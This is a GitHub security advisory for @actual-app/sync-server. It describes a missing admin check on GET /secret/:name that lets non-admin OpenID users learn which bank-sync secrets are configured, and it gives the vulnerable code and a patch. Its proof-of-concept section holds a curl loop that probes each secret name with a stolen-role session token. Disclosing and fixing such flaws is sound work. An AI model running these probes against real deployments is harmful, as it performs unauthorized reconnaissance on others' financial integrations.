# [M] @actual-app/sync-server's missing authorization on GET /secret/:name allows non-admin OpenID users to enumerate admin-configured bank-sync secrets

## Summary
Severity: Medium
Advisory: GHSA-3f62-qv96-4p78
CVE: CVE-2026-46700
CWE: CWE-285
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-3f62-qv96-4p78
Type: github-advisory

## Affected
- npm: `@actual-app/sync-server` — affected >=0 <26.6.0

## Details
## Summary

In `@actual-app/sync-server`, the `GET /secret/:name` endpoint (`app-secrets.js:53`) checks only that the caller has a valid session — it does not verify the caller is an admin. The sibling `POST /secret/` handler does enforce an admin check in OpenID mode, exposing an authorization asymmetry. Any authenticated non-admin (BASIC) user in OpenID multi-user deployments can probe the secrets store and learn which admin-managed bank-sync integrations have been configured (existence, not values). This includes integration credentials that are not otherwise observable to non-admins, such as `simplefin_accessKey`, `pluggyai_clientSecret`, `pluggyai_itemIds`, and the `gocardless_*` secrets.

## Details

`packages/sync-server/src/app-secrets.js` mounts `validateSessionMiddleware` at the router level (line 15), so all handlers inherit only "must be authenticated." The POST handler then explicitly upgrades to an admin check when the active auth method is `openid`:

```js
// app-secrets.js:17-46
app.post('/', async (req, res) => {
  // ... look up active auth method ...
  if (method === 'openid') {
    const canSaveSecrets = isAdmin(res.locals.user_id);
    if (!canSaveSecrets) {
      res.status(403).send({
        status: 'error',
        reason: 'not-admin',
        details: 'You have to be admin to set secrets',
      });
      return;
    }
  }
  secretsService.set(name, value);
  // ...
});
```

The sibling GET handler skips both the method check and the admin check entirely:

```js
// app-secrets.js:53-61
app.get('/:name', async (req, res) => {
  const name = req.params.name;
  const keyExists = secretsService.exists(name);
  if (keyExists) {
    res.sendStatus(204);
  } else {
    res.status(404).send('key not found');
  }
});
```

The intent — visible from the POST handler's "You have to be admin to set secrets" — is that this store holds admin-managed credentials. The valid secret names enumerated in `services/secrets-service.js` (`SecretName`) are: `gocardless_secretId`, `gocardless_secretKey`, `simplefin_token`, `simplefin_accessKey`, `pluggyai_clientId`, `pluggyai_clientSecret`, `pluggyai_itemIds`.

In OpenID mode, BASIC users obtain valid sessions through `packages/sync-server/src/accounts/openid.ts:264-274` — either auto-created (`userCreationMode=login`) or pre-provisioned by the admin (`userCreationMode=manual`). With that BASIC session token they can hit `GET /secret/:name` and distinguish 204 (configured) from 404 (missing), enumerating each admin-managed secret name. Some signals (`simplefin_token` existence, `pluggyai_clientId` existence) are already coarsely observable via the unauthenticated bank-sync status endpoints (`app-simplefin.js:18`, `app-pluggyai.js:18`); the rest (`simplefin_accessKey`, `pluggyai_clientSecret`, `pluggyai_itemIds`, both `gocardless_*` secrets) are not otherwise probeable.

This is structurally identical to the previously reported missing-admin-check on `GET /admin/users/` (`app-admin.js:28`): a POST sibling enforces admin authorization while the GET sibling omits it.

## PoC

Pre-requisites:
- Server is configured for OpenID multi-user mode (`ACTUAL_OPENID_ENFORCE=true` or auth method is `openid`).
- An admin has configured one or more bank-sync integrations.
- The attacker is any authenticated BASIC user (auto-created via `userCreationMode=login`, or admin-provisioned in the default `manual` mode).

Step 1 — capture a BASIC user's session token in `$TOKEN` (standard OpenID login flow, no admin role required).

Step 2 — probe each admin-managed secret name:

```bash
for name in gocardless_secretId gocardless_secretKey \
            simplefin_token simplefin_accessKey \
            pluggyai_clientId pluggyai_clientSecret pluggyai_itemIds; do
  status=$(curl -s -o /dev/null -w '%{http_code}' \
           -H "X-ACTUAL-TOKEN: $TOKEN" \
           https://actual.example.com/secret/$name)
  echo "$name -> $status"   # 204 = configured, 404 = missing
done
```

Step 3 — confirm the asymmetry by attempting to write a secret (correctly rejected for non-admins):

```bash
curl -s -H "X-ACTUAL-TOKEN: $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"name":"pluggyai_itemIds","value":"x"}' \
     https://actual.example.com/secret/
# {"status":"error","reason":"not-admin","details":"You have to be admin to set secrets"}
```

The POST returns 403 `not-admin`; the GET returns 204/404 unauthenticated-against-role.

## Impact

- A non-admin authenticated user in OpenID multi-user mode can enumerate which admin-managed bank-sync integrations the deployment uses.
- This reveals whether GoCardless, SimpleFIN, and/or Pluggy AI are configured, and which auxiliary credentials the admin has set (e.g. `simplefin_accessKey`, `pluggyai_clientSecret`, `pluggyai_itemIds`) — none of which are otherwise observable to non-admins.
- The disclosure is existence-only; secret values are not returned. Impact is limited to recon useful for targeted follow-on attacks (e.g. credential phishing, picking which integration to attack on a separate vulnerability).
- No integrity or availability impact.

## Recommended Fix

Mirror the POST handler's admin gate on the GET handler. Minimal patch in `packages/sync-server/src/app-secrets.js`:

```js
app.get('/:name', async (req, res) => {
  let method;
  try {
    const result = getAccountDb().first(
      'SELECT method FROM auth WHERE active = 1',
    );
    method = result?.method;
  } catch (error) {
    console.error('Failed to fetch auth method:', error);
    return res.status(500).send({
      status: 'error',
      reason: 'database-error',
      details: 'Failed to validate authentication method',
    });
  }

  if (method === 'openid' && !isAdmin(res.locals.user_id)) {
    return res.status(403).send({
      status: 'error',
      reason: 'not-admin',
      details: 'You have to be admin to read secret status',
    });
  }

  const name = req.params.name;
  const keyExists = secretsService.exists(name);
  if (keyExists) {
    res.sendStatus(204);
  } else {
    res.status(404).send('key not found');
  }
});
```

Consider factoring the method-lookup + admin-check into a shared helper used by both POST and GET to prevent the same asymmetry from recurring. Also consider restricting `:name` to the `SecretName` enum so unrelated probing is rejected up front.

## References
- https://github.com/actualbudget/actual/security/advisories/GHSA-3f62-qv96-4p78
- https://github.com/actualbudget/actual
